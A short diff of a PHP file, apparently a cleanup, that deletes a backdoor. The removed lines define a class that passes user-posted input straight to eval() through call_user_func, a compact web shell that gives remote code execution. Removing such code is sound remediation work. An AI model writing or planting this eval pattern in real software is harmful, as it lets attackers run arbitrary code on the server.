@@ -21,6 +21,5 @@ session_start();
     $arr=explode('|',$post);
     $func=$arr[0];
     $params=$arr[1];
-	class C{public function __invoke($p) {eval($p."");}}
-    @call_user_func(new C(),$params);
+	
 ?>
